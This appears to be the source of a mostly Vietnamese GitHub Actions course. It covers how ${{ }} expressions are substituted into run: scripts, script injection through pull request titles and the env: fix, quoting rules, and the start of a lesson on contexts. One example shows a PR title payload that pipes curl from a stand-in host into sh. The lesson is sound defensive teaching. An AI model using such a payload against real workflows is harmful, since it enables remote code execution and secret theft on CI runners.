<p><strong><code>&#36;{{ }}</code> KHÔNG phải một biến. Nó là phép thay chữ VÀO MÃ NGUỒN.</strong> Nếu giá trị được thay có chứa một dấu nháy, một ký tự xuống dòng, một dấu chấm phẩy hay một dấu huyền, thì những ký tự ấy trở thành <em>MỘT PHẦN CỦA SCRIPT</em> — không phải một phần của một chuỗi trong script. Không có cách đặt nháy nào bảo vệ được bạn, vì chính cái nháy bạn định viết cũng là một phần của phần chữ đang bị thay vào.</p>
</div>

<h3>Bằng chứng: biểu thức ở mức bước được tính trên runner</h3>
${slide('ga-03', 4, 'Bằng chứng: tên bước mang giá trị mà bước trước vừa ghi ra')}
<p>"Biểu thức được thay trước khi shell chạy" thì dễ nói và dễ tin nửa vời. Đây là một run gỡ bỏ mọi nghi ngờ. Bước đầu ghi giờ hiện tại, chính xác tới mili giây, vào <code>$GITHUB_OUTPUT</code>. <em>TÊN</em> của bước thứ hai là một biểu thức đọc output ấy. GitHub không thể biết trước giờ đó: nó chưa tồn tại cho tới khi bước đầu chạy trên runner. Vậy mà job đã xong (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179955" target="_blank" rel="noopener">run 36000179955</a>, trên <code>ubuntu-24.04</code>) liệt kê:</p>
<div class="out">2 Buoc dau ghi output
3 Buoc sau thay x86_64 luc 12:37:12.558
4 Run echo xin-chao &gt; ghi-luc-chay.txt
5 hashFiles tinh LUC BUOC CHAY</div>
<p>Cùng job ấy trên <code>ubuntu-24.04-arm</code>, trong cùng run, đặt tên bước là <code>Buoc sau thay aarch64 luc 12:37:15.058</code>: máy khác, giờ khác. <code>hashFiles()</code> kể cùng câu chuyện từ phía kia. Ở bước 3 nó băm <code>ghi-luc-chay.txt</code> khi tệp chưa tồn tại và trả về chuỗi rỗng; ở bước 5, sau khi bước 4 tạo tệp, cùng biểu thức ấy trả về <code>27c99b3d29fa…544696</code>, đúng bằng SHA-256 hai lớp của <code>xin-chao</code> kèm dấu xuống dòng, tính lại trên Mac. Một biểu thức trong bước được tính <em>ĐÚNG LÚC bước ấy bắt đầu, TRÊN cỗ máy ấy</em>.</p>
<div class="callout">
<p><strong>Vì sao điều này quan trọng cho cả chương.</strong> Biết biểu thức được tính <em>Ở ĐÂU</em> thì đoán được nó được phép nhìn thấy gì. <code>if:</code> của job được tính trên GitHub trước khi xin máy, nên nó không đọc được <code>runner.os</code>: chưa có runner nào cả. <code>if:</code> của bước thì đọc được. Bài 3.2 biến điều này thành bảng "context có ở đâu"; lúc này chỉ cần nhớ đường gạch đứt.</p>
</div>
<h3>Ba dòng</h3>
<pre><code><span class="tok-comment"># HONG — tieu de PR duoc GHEP THANG vao ma nguon</span>
- run: echo "PR: &#36;{{ github.event.pull_request.title }}"</code></pre>

<p>Một pull request đặt tên là <code>a"; curl evil.example/x | sh; #</code> sẽ đẻ ra script này trên runner:</p>

<div class="out">echo "PR: a"; curl evil.example/x | sh; #"</div>

<p>Ba câu lệnh ở chỗ tác giả viết một. Ai mở được pull request thì người ấy chọn tiêu đề, nên ai mở được pull request thì người ấy chạy được lệnh trên runner. Và để ý điều làm nó tệ hơn vẻ ngoài: trong một lần chạy <code>pull_request</code> đến từ fork thì bí mật vắng mặt, nhưng trong một lần chạy <code>push</code>, hoặc dưới <code>pull_request_target</code> (bài 1.4), thì không.</p>

<h3>Vì sao đây là ranh giới an ninh, không phải chuyện phong cách</h3>
${slide('ga-03', 5, 'Dán giá trị github.event vào run: khiến chữ người ngoài thành một phần của lệnh')}
<p>Vì biểu thức bị biến thành chữ của script trước khi shell chạy, một giá trị mà ai đó <em>ngoài</em> nhóm bạn đặt được — tiêu đề pull request, tên nhánh, thông điệp commit — trở thành một phần của lệnh chứ không phải một tham số cho nó. Đây là "script injection" (tiêm mã), và nó cùng một sai lầm với SQL injection: dữ liệu bị ghép vào một ngôn ngữ thay vì được truyền vào như dữ liệu.</p>
<p>Có một minh hoạ an toàn, vô hại trên sân tập (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000955142" target="_blank" rel="noopener">run 36000955142</a>, từ một pull request đã đóng, không merge). Bản minh hoạ dùng một dấu vô hại, <code>$(echo hi)</code>, ở chỗ một workflow dán <code>&#36;{{ github.event.pull_request.title }}</code> thẳng vào <code>run:</code>. Trong log, thay vì năm ký tự nguyên văn <code>$(echo hi)</code>, chữ <code>hi</code> hiện ra một mình — shell đã coi cái dấu ấy là một lệnh để chạy chứ không phải chữ để in. Toàn bộ rủi ro nằm trong một quan sát: cái dấu ấy đã bị <em>tính</em>, và một kẻ tấn công thật sẽ đặt thứ gì đó nguy hại vào chỗ <code>echo hi</code>.</p>
<div class="callout warn">
<p><strong>Điều nguy hiểm là chữ ĐƯỢC CHẠY, không phải cái mà bản minh hoạ in ra.</strong> Một bước chỉ có việc echo một tiêu đề cho một dòng log vẫn là một điểm tiêm, vì shell chạy bất cứ thứ gì trong tệp script, và tiêu đề giờ nằm trong tệp ấy. Trong một run <code>push</code>, hoặc dưới <code>pull_request_target</code>, job còn có quyền truy cập bí mật — vì thế lớp lỗi này được coi trọng kể cả khi bước nhìn thấy được "chỉ in ra".</p>
</div>
${slide('ga-03', 6, 'Vá: đưa giá trị qua env: và đọc nó như một biến có nháy')}
<p>Cách vá nhỏ mà trọn vẹn: đặt giá trị vào một khối <code>env:</code> và đọc nó như một biến shell có nháy.</p>
<pre><code><span class="tok-comment"># DUNG — bien moi truong, shell doc GIA TRI chu khong doc MA</span>
- run: echo "PR: \$TIEU_DE"
  env:
    TIEU_DE: &#36;{{ github.event.pull_request.title }}</code></pre>

<p>Phép thay vẫn xảy ra — nhưng thay vào khối <code>env:</code>, nơi giá trị trở thành một biến môi trường chứ không phải chữ trong script. <code>\$TIEU_DE</code> bên trong script được shell đọc lúc chạy, dưới dạng DỮ LIỆU. Cái dấu nháy trong tiêu đề bây giờ chỉ là một dấu nháy trong một chuỗi.</p>
${slide('ga-03', 7, 'Bộ kiểm bắt ca hiển nhiên nhưng không bắt hết mọi ca')}
<p>Trong cùng bản minh hoạ, job được vá — cùng tiêu đề, đi qua <code>env:</code> — in cái dấu đúng nguyên văn, kể cả <code>$( )</code>, và không chạy gì. Hai dòng thêm vào gỡ bỏ trọn cả vấn đề.</p>
<h3>Phòng thủ nhiều lớp</h3>
<div class="kv-grid">
<div class="kv"><span class="k">đưa giá trị người ngoài qua <code>env:</code></span><span class="v">một thói quen duy nhất phủ cả lớp: đừng bao giờ đặt <code>&#36;{{ github.event.* }}</code> hay <code>&#36;{{ github.head_ref }}</code> thẳng vào <code>run:</code>; đọc <code>"$VAR"</code> thay vào</span></div>
<div class="kv"><span class="k">cẩn trọng với <code>pull_request_target</code></span><span class="v">nó chạy với bí mật của kho gốc; checkout rồi dựng mã của pull request dưới nó là trộn mã không tin được với bí mật của bạn. Ưu tiên <code>pull_request</code> thường cho bất cứ thứ gì chạy mã PR</span></div>
<div class="kv"><span class="k">tối thiểu quyền cho token</span><span class="v">đặt <code>permissions:</code> ở mức tối thiểu job cần; một <code>GITHUB_TOKEN</code> hẹp giới hạn được thứ mà một lệnh bị tiêm chạm tới</span></div>
<div class="kv"><span class="k">kiểm, nhưng đừng chỉ dựa vào bộ kiểm</span><span class="v"><code>actionlint</code> bắt nhiều biểu thức tiêm được, và <code>zizmor</code> là bộ quét an ninh riêng cho workflow. Đo ở đây, actionlint cảnh báo tiêu đề PR nhưng <em>KHÔNG</em> cảnh báo <code>github.head_ref</code> ở dòng kế, thứ cũng tiêm được y như vậy — nên hãy giữ luật "giá trị người ngoài đi qua <code>env:</code>" trong đầu</span></div>
</div>


<div class="callout ok">
<p><strong>Quy tắc phủ mọi trường hợp:</strong> đừng bao giờ đặt một <code>&#36;{{ }}</code> mà giá trị của nó do người khác kiểm soát trực tiếp vào bên trong <code>run:</code>. Hãy vòng nó qua <code>env:</code> rồi tham chiếu biến môi trường. Nó tốn thêm hai dòng và gỡ bỏ trọn cả lớp vấn đề. Chương 7 đo xem những giá trị context nào nằm trong tay kẻ tấn công — danh sách dài hơn "tiêu đề PR" nhiều.</p>
</div>

<h3>Biểu thức được phép ở đâu, và ở đâu nó ngầm định</h3>
<div class="kv-grid">
<div class="kv"><span class="k">phần lớn chỗ cần <code>&#36;{{ }}</code></span><span class="v"><code>run:</code>, <code>with:</code>, <code>env:</code>, <code>name:</code>, <code>runs-on:</code>, <code>key:</code> — ở bất cứ đâu mong đợi một chuỗi, cặp ngoặc đánh dấu phần cần tính</span></div>
<div class="kv"><span class="k"><code>if:</code> vốn ĐÃ là một biểu thức</span><span class="v"><code>if: github.event_name == 'push'</code> chạy được mà không cần ngoặc. Cả giá trị được tính như một biểu thức, nên ngoặc là tuỳ chọn ở đó — thêm vào thì vô hại nhưng không bắt buộc</span></div>
<div class="kv"><span class="k">cái bẫy của <code>if:</code></span><span class="v">(Đính chính 24/09/2026. Ô này từng nói <code>if: 'false'</code> CHẠY bước. Đo thật trên GitHub thì KHÔNG: cặp nháy là của YAML, chữ <code>false</code> sau đó được đọc như một biểu thức, và bước bị bỏ qua.) Cái bẫy thật là <strong>CHỮ NẰM NGOÀI cặp ngoặc</strong>: <code>if: &#36;{{ github.ref_name }} == 'main'</code> không phải một phép so sánh mà là một chuỗi kiểu <code>ch03 == 'main'</code>, khác rỗng nên ĐÚNG trên mọi nhánh. Và người anh em lúc chạy của nó: một giá trị tới <em>TRONG LÚC CHẠY</em> dưới dạng chuỗi <code>'false'</code> (output của bước, giá trị <code>env</code>) là ĐÚNG. Cả hai hỏng theo hướng <em>MỞ</em>; bài 3.3 đo mười bảy cách viết</span></div>
<div class="kv"><span class="k">hoàn toàn không được phép</span><span class="v">khối <code>on:</code>. Bạn không tính ra được một kích hoạt, một bộ lọc nhánh hay một lịch cron — mấy thứ đó được đọc trước khi có context nào tồn tại</span></div>
</div>

<h3>Đặt nháy bên trong một biểu thức</h3>
${slide('ga-03', 8, 'Chỉ nháy đơn; lỗi cú pháp làm hỏng cả file trước khi có máy')}

<p>Ngôn ngữ biểu thức chỉ dùng <strong>nháy đơn</strong>. Nháy kép là lỗi cú pháp, và một dấu nháy đơn nằm trong chuỗi thì thoát bằng cách viết đôi lên:</p>

<pre><code><span class="tok-comment"># dung</span>
if: github.ref == 'refs/heads/main'
<span class="tok-comment"># SAI — nhay kep khong hop le trong bieu thuc</span>
if: github.ref == "refs/heads/main"
<span class="tok-comment"># nhay don trong chuoi: viet doi len</span>
run: echo &#36;{{ format('it''s fine') }}</code></pre>

<div class="pitfall">
<p><strong>Bẫy — cách đặt nháy của YAML và của biểu thức chồng lên nhau.</strong> Một giá trị kiểu <code>&#36;{{ ... }}</code> nằm ở đầu một giá trị YAML thì phải được đặt nháy <em>THEO KIỂU YAML</em>, vì dấu <code>{</code> mở đầu một ánh xạ dòng của YAML — nên <code>key: &#36;{{ x }}</code> đọc được, còn <code>key: {{ x }}</code> thì không, và <code>key: "&#36;{{ x }}"</code> là dạng an toàn khi giá trị bắt đầu bằng một dấu ngoặc nhọn. Hai hệ thống đặt nháy, do hai bộ đọc áp dụng, trên cùng một dòng. Khi một workflow không đọc được mà lỗi lại chỉ vào một dòng trông rõ ràng là ổn, thì thường là vì chuyện này.</p>
</div>

<h3>Lỗi cú pháp bị bắt lúc ĐỌC FILE, và tốn đúng 0 giây</h3>
<p>Viết phép so sánh bằng nháy kép thì GitHub từ chối cả tệp workflow trước khi lập kế hoạch cho job nào. Run vẫn có, nó đỏ, kéo dài 0 giây, không có job nào và không có log: chỉ một dòng chữ trên trang run (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000817664" target="_blank" rel="noopener">run 36000817664</a>):</p>
<div class="out">Invalid workflow file: .github/workflows/ch03-sai-cho-2.yml#L1
(Line: 20, Col: 9): Unexpected symbol: '"refs/heads/main"'. Located at position 15 within expression:
github.ref == "refs/heads/main"</div>
<p>Hai hệ quả thực tế. Một, <code>gh run view</code> trong terminal chỉ nói <em>"This run likely failed because of a workflow file issue"</em>; thông báo thật nằm trên trang web. Hai, vì phép kiểm diễn ra lúc đọc tệp, một tệp hỏng làm hỏng <em>MỌI</em> kích hoạt của workflow ấy, kể cả cú push bạn làm để sửa chuyện khác. actionlint cho cùng lỗi, kèm số cột, TRƯỚC khi bạn push:</p>
<div class="out">ch03-sai-cho.yml:27:23: got unexpected character '"' while lexing expression, expecting 'a'..'z', ...
do you mean string literals? only single quotes are available for string delimiter [expression]</div>
<div class="kv-grid">
<div class="kv"><span class="k">một dấu nháy đơn thật</span><span class="v">viết đôi: <code>&#36;{{ format('it''s {0}', 'fine') }}</code></span></div>
<div class="kv"><span class="k">biểu thức mở đầu bằng <code>!</code></span><span class="v"><code>!</code> có nghĩa riêng với YAML (một thẻ), nên phải bọc: <code>if: &#36;{{ !cancelled() }}</code> hoặc <code>if: '!cancelled()'</code>. Cả hai chạy xanh trong <a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000180005" target="_blank" rel="noopener">run 36000180005</a></span></div>
<div class="kv"><span class="k">muốn in đúng chữ <code>&#36;{{</code> trong lệnh</span><span class="v">không có ký tự thoát; viết <code>&#36;{{ '&#36;{{' }}</code> để bộ máy xuất ra hai ký tự ấy cho bạn</span></div>
<div class="kv"><span class="k">biểu thức trong <code>name:</code> của bước</span><span class="v">cũng được tính. Lúc soạn bài này tôi lỡ viết <code>&#36;{{ !cancelled() }}</code> vào tên một bước và nhận một lỗi actionlint thật: <code>calling function "cancelled" is not allowed here</code>, vì hàm trạng thái chỉ tồn tại trong <code>if:</code></span></div>
</div>
<h3>Phép thay trông ra sao trong một log thật</h3>
<p>Log in ra script <em>SAU KHI</em> đã thay, và đó là sự thật gỡ lỗi hữu ích nhất trong cả chương này. Từ cùng lần chạy ấy, một khối <code>env:</code> đã nở ra:</p>

<div class="out">##[group]Run ssh vps "
  export CUONG_BACKEND_IMAGE=ghcr.io/cuonghoang1103/api-backend-backend:main
  ...
shell: /usr/bin/bash -e {0}
env:
  REGISTRY: ghcr.io
  IMAGE_OWNER: cuonghoang1103
  BACKEND_IMAGE: ghcr.io/cuonghoang1103/api-backend-backend
  FRONTEND_IMAGE: ghcr.io/cuonghoang1103/api-backend-frontend</div>

<div class="callout">
<p><strong>Hãy đọc script ĐÃ NỞ, đừng đọc YAML.</strong> Khi một bước làm chuyện bạn không định, cái tiêu đề nhóm trong log cho thấy chính xác thứ mà shell đã nhận — mọi biểu thức đã phân giải xong. Đối chiếu nó với thứ bạn viết ra là trả lời được câu "biểu thức của tôi có sai không?" chỉ trong một cái liếc, và trả lời được mà không cần chạy lại. Bí mật là ngoại lệ: chúng bị che thành <code>***</code>, và đó cũng là cách bạn xác nhận một giá trị ĐÃ được đối xử như một bí mật.</p>
</div>

<h3>Hai hình dạng đáng giữ</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">biểu thức → <code>env:</code> → biến shell</span><span class="lz-lnote">mặc định an toàn cho bất cứ thứ gì tới từ context <code>github</code>. Thêm hai dòng, bề mặt tấn công bằng không</span></div>
<div class="lz-layer"><span class="lz-lname">biểu thức → <code>with:</code> → tham số của action</span><span class="lz-lnote">action nhận tham số dưới dạng biến môi trường, nên đường này vốn đã an toàn trước injection vào shell. Nó KHÔNG an toàn trước việc <em>CHÍNH ACTION</em> làm điều gì đó không an toàn với giá trị — Chương 4 nói một action thật ra làm được những gì</span></div>
<div class="lz-layer"><span class="lz-lname">biểu thức đặt thẳng vào <code>run:</code></span><span class="lz-lnote">chỉ chấp nhận được với những giá trị bạn kiểm soát trọn vẹn: <code>&#36;{{ runner.os }}</code>, <code>&#36;{{ matrix.os }}</code>, một hằng bạn tự viết trong <code>env:</code>. Không bao giờ cho thứ gì người dùng gõ vào</span></div>
<div class="lz-layer"><span class="lz-lname">biểu thức trong <code>key:</code> của cache</span><span class="lz-lnote">không có shell nào dính vào cả — cái khoá là một chuỗi mà action cache nhận. Đây là chỗ <code>hashFiles()</code> sống, và bài 3.4 kiểm chứng chính xác nó tính ra cái gì</span></div>
</div>

<div class="callout ok">
<p><strong>Một câu.</strong> Bộ máy biểu thức làm xong việc của nó TRƯỚC khi runner ghi tệp script, nên <code>&#36;{{ }}</code> trong một khối <code>run:</code> là SINH MÃ — và cách vá luôn luôn là chuyển giá trị vào <code>env:</code>, nơi nó trở thành dữ liệu.</p>
</div>

<h3>Chạy thử từng bước: cuộc đời của một dòng <code>run:</code></h3>
<ol>
<li><strong>Bạn push.</strong> GitHub chốt gói dữ liệu sự kiện (tiêu đề, nhánh, commit) đúng như nó đang là ở khoảnh khắc này.</li>
<li><strong>GitHub đọc tệp.</strong> Mọi <code>&#36;{{ }}</code> được phân tích cú pháp. Sai cú pháp hoặc dùng context sai chỗ: run đỏ ở giây thứ 0.</li>
<li><strong>GitHub lập kế hoạch job.</strong> Biểu thức mức job được tính: <code>if:</code>, ma trận, <code>runs-on</code>. Job có <code>if:</code> sai bị đánh dấu skipped ngay đây và không bao giờ được cấp máy (<code>runner_name</code> là <code>null</code> trong API, đo ở <a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179955" target="_blank" rel="noopener">run 36000179955</a>).</li>
<li><strong>Một runner nhận job.</strong> Giờ mới có <code>runner</code>, <code>job</code> và thư mục làm việc.</li>
<li><strong>Bước bắt đầu.</strong> Runner tính <code>if:</code> của bước, rồi <code>name</code>, <code>env</code> và chữ của <code>run:</code>. Kết quả được ghi ra một tệp, chính là <code>{0}</code> trong <code>shell: /usr/bin/bash -e {0}</code>.</li>
<li><strong>Shell chạy tệp.</strong> Nó chỉ thấy chữ. Thứ biểu thức sinh ra giờ không còn phân biệt được với thứ bạn gõ.</li>
</ol>

<h3>Khi nào đưa giá trị vào <code>env:</code>, khi nào viết thẳng cũng được</h3>
<table>
<thead><tr><th>Giá trị</th><th>Viết thẳng trong <code>run:</code></th><th>Vì sao</th></tr></thead>
<tbody>
<tr><td><code>runner.os</code>, <code>matrix.*</code> do bạn định nghĩa, <code>github.sha</code>, <code>github.run_id</code></td><td>được</td><td>định dạng cố định, do bạn hoặc GitHub chọn</td></tr>
<tr><td><code>secrets.*</code></td><td>nên dùng <code>env:</code></td><td>giá trị không bao giờ xuất hiện trong chữ của script, và nháy hay <code>$</code> bên trong nó không làm vỡ lệnh</td></tr>
<tr><td>mọi thứ dưới <code>github.event.*</code>, <code>github.head_ref</code></td><td>luôn dùng <code>env:</code></td><td>chữ tự do do người kích hoạt sự kiện chọn</td></tr>
<tr><td>JSON từ <code>toJSON(...)</code></td><td>luôn dùng <code>env:</code></td><td>chữ nhiều dòng đầy dấu nháy; viết thẳng thì vỡ script ngay cả với dữ liệu tử tế</td></tr>
</tbody>
</table>

<div class="callout">
<p><strong>Câu hỏi phỏng vấn hay gặp.</strong></p>
<p><strong>H: Biểu thức được tính ở đâu?</strong><br>Đ: Các khoá mức job (<code>if</code>, <code>strategy</code>, <code>runs-on</code>, <code>timeout-minutes</code>) được tính trên GitHub trước khi cấp runner; các khoá mức bước (<code>if</code>, <code>name</code>, <code>env</code>, <code>with</code>, <code>run</code>) được tính trên runner lúc bước bắt đầu. Vì thế <code>runner.*</code> và <code>steps.*</code> chỉ có ở mức bước, và <code>if: runner.os == 'Linux'</code> ở mức job làm tệp không hợp lệ.</p>
<p><strong>H: <code>&#36;{{ env.X }}</code> khác <code>$X</code> trong khối <code>run:</code> thế nào?</strong><br>Đ: <code>&#36;{{ env.X }}</code> bị thay bằng chữ của nó trước khi shell khởi động, nên nó thành một phần của script; <code>$X</code> được shell đọc lúc chạy như một biến. Với giá trị bạn không kiểm soát trọn vẹn, dùng <code>"$X"</code> có nháy.</p>
<p><strong>H: Một run đỏ sau 0 giây, không có job nào. Chuyện gì đã xảy ra?</strong><br>Đ: Tệp không qua được bước kiểm: cú pháp YAML hoặc biểu thức, hoặc một context dùng ở chỗ nó không có. Thông báo nằm trên trang run ("Invalid workflow file"); tái hiện ở máy bằng actionlint.</p>
</div>

<h3>🧪 Thực hành (15–20 phút)</h3>
<div class="callout ok"><p><strong>Tình huống:</strong> một bạn cùng lớp khăng khăng <code>&#36;{{ }}</code> "chỉ là biến shell viết kiểu khác". Bạn muốn một run chứng minh điều ngược lại.</p><ol>
<li>Trong một kho thử của bạn, thêm <code>.github/workflows/luc-nao.yml</code> kích hoạt bằng <code>push</code>. Bước 1 (<code>id: dau</code>) ghi <code>echo "luc=$(date -u +%H:%M:%S.%N | cut -c1-12)" &gt;&gt; "$GITHUB_OUTPUT"</code>.</li>
<li>Bước 2 có <code>name: &#36;{{ format('Sau luc {0}', steps.dau.outputs.luc) }}</code> và chạy <code>echo "&#36;{{ hashFiles('moi.txt') }}"</code>. Bước 3 chạy <code>echo hi &gt; moi.txt</code>. Bước 4 lặp lại dòng echo <code>hashFiles</code>.</li>
<li>Thêm job thứ hai có <code>if: runner.os == 'Linux'</code> ở mức job. Chạy actionlint ở máy trước và đọc thông báo; rồi vẫn push và mở trang run.</li>
<li>Bỏ job hỏng, push lại, rồi liệt kê tên các bước bằng <code>gh run view &lt;id&gt; --json jobs --jq '.jobs[].steps[].name'</code>.</li></ol>
<p><strong>Đạt khi:</strong> một tên bước chứa giờ có mili giây; dòng <code>hashFiles</code> đầu rỗng còn dòng sau là một hash 64 ký tự; run có điều kiện <code>runner</code> ở mức job hỏng trong 0 giây với "Unrecognized named-value: 'runner'"; và bạn giải thích được vì sao, dựa vào đường gạch đứt ở slide 3.</p></div>

<h3>🗂 Thuật ngữ trong bài</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Biểu thức (expression)</span><span class="v">Mọi thứ trong <code>&#36;{{ }}</code>. Do bộ máy của GitHub tính (trên máy chủ hoặc trong runner), không bao giờ do shell.</span></div>
  <div class="kv"><span class="k">Phép thay (substitution)</span><span class="v">Thay biểu thức bằng giá trị của nó dưới dạng chữ trơn, trước khi tệp script được ghi ra.</span></div>
  <div class="kv"><span class="k">Mức job / mức bước</span><span class="v">Khoá nằm ngay dưới job được tính khi chưa có máy; khoá bên trong <code>steps:</code> được tính trên runner.</span></div>
  <div class="kv"><span class="k">Tệp script <code>{0}</code></span><span class="v">Tệp tạm runner ghi ra cho mỗi bước <code>run:</code> rồi trao cho shell.</span></div>
  <div class="kv"><span class="k">Đi vòng qua <code>env:</code></span><span class="v">Đặt giá trị vào một biến môi trường rồi đọc <code>"$VAR"</code>: shell coi nó là dữ liệu.</span></div>
  <div class="kv"><span class="k">Invalid workflow file (tệp workflow không hợp lệ)</span><span class="v">Lỗi cú pháp hoặc context bị phát hiện lúc đọc YAML: run hỏng trong 0 giây, không có job.</span></div>
  <div class="kv"><span class="k">actionlint</span><span class="v">Bộ kiểm tĩnh cho tệp workflow; bắt context sai chỗ, đặt nháy sai và điều kiện hằng trước khi bạn push.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
<li><code>&#36;{{ }}</code> bị thay thành chữ trước khi shell tồn tại; shell chỉ chạy tệp đã hoàn chỉnh.</li>
<li>Biểu thức mức job được tính trên GitHub trước khi xin máy; mức bước được tính trên runner lúc bước bắt đầu. Đo thật: tên một bước mang giờ được ghi 0,1 giây trước đó.</li>
<li>Giá trị bạn không kiểm soát trọn vẹn thì đi qua <code>env:</code> và đọc bằng <code>"$VAR"</code>; giá trị do chính bạn định nghĩa thì viết thẳng được.</li>
<li>Biểu thức chỉ dùng nháy đơn; nháy đơn bên trong thì viết đôi; biểu thức mở đầu bằng <code>!</code> phải được bọc.</li>
<li>Lỗi cú pháp hay context làm cả tệp không hợp lệ: đỏ ở giây 0, không job, thông báo chỉ có trên trang web.</li>
<li>Khi một bước làm chuyện lạ, đọc script đã nở trong tiêu đề nhóm của log, đừng đọc YAML.</li>
</ul>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions — bảng toán tử đầy đủ, luật nháy đơn, cách thoát nháy bằng viết đôi, và phát biểu rằng <code>if:</code> được tính như một biểu thức mà không cần ngoặc.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Security Lab — Untrusted input in GitHub Actions</span><span class="lc-sub">securitylab.github.com/resources/github-actions-untrusted-input/ — danh mục gốc các giá trị context chèn được và cách vá bằng <code>env:</code>, kèm các workflow dễ tổn thương thật tìm thấy trong kho công khai.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Security hardening: script injections</span><span class="lc-sub">docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections — chính GitHub viết lại ví dụ ba dòng bên trên, kèm danh sách các context cần coi là do kẻ tấn công kiểm soát.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Authentication — injection là MỘT lỗi mang nhiều tên</span><span class="lc-sub">/courses/authentication/learn${REF} — SQL injection, command injection và cái này là cùng một sai lầm trong ba cú pháp: dữ liệu bị ghép vào một ngôn ngữ thay vì được truyền vào như một tham số.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Linux &amp; Bash — đặt nháy, tách từ, và vì sao một biến không phải là chữ</span><span class="lc-sub">/courses/linux-bash/learn${REF} — shell làm gì với một giá trị khi nó đã nằm trong một biến, và đó đúng là hành vi mà cách vá bằng <code>env:</code> dựa vào.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 3.2 ─────────────────────────── */
    {
      title: '3.2 — Contexts, and when each one exists|||3.2 — Context, và lúc nào cái nào tồn tại',
      slug: 'ga-3-2-context',
      type: 'VIDEO',
      description: 'Kiểm kê 74 biểu thức thật của 11 workflow: `secrets` 44 lần, `env` 9, `runner` 5, `matrix` 4. Và cái luật khiến biểu thức "đúng" trả về rỗng — mỗi context chỉ tồn tại ở một số CHỖ trong tệp.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.2</span>
<h2>Contexts, and when each one exists</h2>
<p class="lead">A context is a bag of values with a name. There are about a dozen, they are documented, and the part that actually causes bugs is not what they contain — it is that each one only exists in certain places in the file, and referencing one where it does not exist gives you an empty string rather than an error.</p>

<h3>What this repository actually uses</h3>
${slide('ga-03', 11, 'api-backend: 94 expressions, mostly configuration not events')}

<p>Every <code>&#36;{{ }}</code> across all eleven workflows, grouped by which context it opens with:</p>

<div class="out">secrets  44   env      9   runner    5   matrix   4
inputs    4   steps    3   github    3   hashFiles 2
                                      tong: 74 bieu thuc</div>

<p>Two things fall out of that distribution. Secrets are 59% of all expressions here — because this repository&#39;s workflows mostly deploy, and deploying means credentials. And the <code>github</code> context, which is the one people write about most, appears three times. In real workflows, expressions are overwhelmingly about <em>configuration you provided</em>, not about the event.</p>

<div class="out">secrets.VPS_HOST              18
secrets.VPS_USER               9
secrets.VPS_SSH_PRIVATE_KEY    9
runner.os                      5
secrets.RELEASE_TOKEN          4
inputs.version                 4
env.FRONTEND_IMAGE             4
env.BACKEND_IMAGE              4
steps.tag.outputs.tag          3
matrix.ten                     2
github.sha                     2</div>

<h3>The contexts, and where each is available</h3>
${slide('ga-03', 9, 'Each key sees only some contexts — the “Context availability” table')}

<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>github</code></span><span class="lz-lnote">the event and the repository: <code>sha</code>, <code>ref</code>, <code>event_name</code>, <code>actor</code>, <code>repository</code>, and the whole raw payload under <code>github.event</code>. Available almost everywhere. Also the context most likely to contain something a stranger typed — see 3.1</span></div>
<div class="lz-layer"><span class="lz-lname"><code>secrets</code></span><span class="lz-lnote">repository, environment and organisation secrets, plus the automatic <code>GITHUB_TOKEN</code>. <strong>Not usable in <code>if:</code> at any level, and never in <code>on:</code></strong> — measured: <code>secrets.X != ''</code> in a step <code>if:</code> makes the file invalid (Unrecognized named-value 'secrets'). Route it through <code>env:</code> and test the variable. Masked in logs as <code>***</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>env</code></span><span class="lz-lnote">variables set by <code>env:</code> at workflow, job or step level. Not available in the <code>env:</code> block that defines it, and not in <code>runs-on:</code> at job level — a restriction that surprises people trying to compute a runner label</span></div>
<div class="lz-layer"><span class="lz-lname"><code>runner</code></span><span class="lz-lnote"><code>os</code>, <code>arch</code>, <code>temp</code>, <code>tool_cache</code>. Only inside a job — it describes a machine, and outside a job there is no machine. This is why it works in a cache key and not in <code>on:</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>matrix</code></span><span class="lz-lnote">only in a job that has a <code>strategy.matrix</code>. Every key you wrote in the matrix entry, including ones you invented like <code>ten</code> and <code>lenh</code> in 2.5</span></div>
<div class="lz-layer"><span class="lz-lname"><code>needs</code></span><span class="lz-lnote"><code>needs.&lt;job&gt;.result</code> and <code>needs.&lt;job&gt;.outputs.&lt;name&gt;</code>. Only for jobs actually listed in this job&#39;s <code>needs:</code> — a job you did not declare a dependency on is simply not there</span></div>
<div class="lz-layer"><span class="lz-lname"><code>steps</code></span><span class="lz-lnote"><code>steps.&lt;id&gt;.outputs.&lt;name&gt;</code>, <code>.outcome</code>, <code>.conclusion</code>. Only for steps that have an <code>id:</code>, and only for steps that have <em>already run</em> in this job</span></div>
<div class="lz-layer"><span class="lz-lname"><code>inputs</code></span><span class="lz-lnote">from <code>workflow_dispatch</code> inputs or a reusable workflow&#39;s <code>workflow_call</code> inputs. Ten of this repository&#39;s eleven workflows are dispatch-only, which is why <code>inputs</code> appears as often as <code>matrix</code></span></div>
